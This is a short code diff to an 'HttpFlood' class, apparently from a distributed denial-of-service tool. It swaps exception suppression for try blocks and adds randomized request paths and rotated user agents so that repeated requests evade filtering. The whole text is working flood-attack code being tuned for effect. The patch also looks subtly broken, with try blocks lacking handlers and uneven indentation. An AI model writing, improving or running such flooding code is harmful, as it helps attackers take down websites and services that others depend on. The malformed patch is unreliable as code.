@@ -1131,8 +1131,9 @@ class HttpFlood(Thread):
 
     def STRESS(self) -> None:
         s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
+        try:
+             s = self.open_connection()
+             for _ in range(self._rpc):
                 # [OPTIMIZED] Dynamic Path
                 path = self.get_random_target_path()
                 ua = randchoice(self._useragents)
@@ -1358,7 +1359,8 @@ class HttpFlood(Thread):
                         f"{headers}"
                         "\r\n").encode("utf-8")
         s = None
-        with suppress(Exception), self.open_connection() as s:
+        try:
+            s = self.open_connection()
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
                     # global REQUESTS_SENT
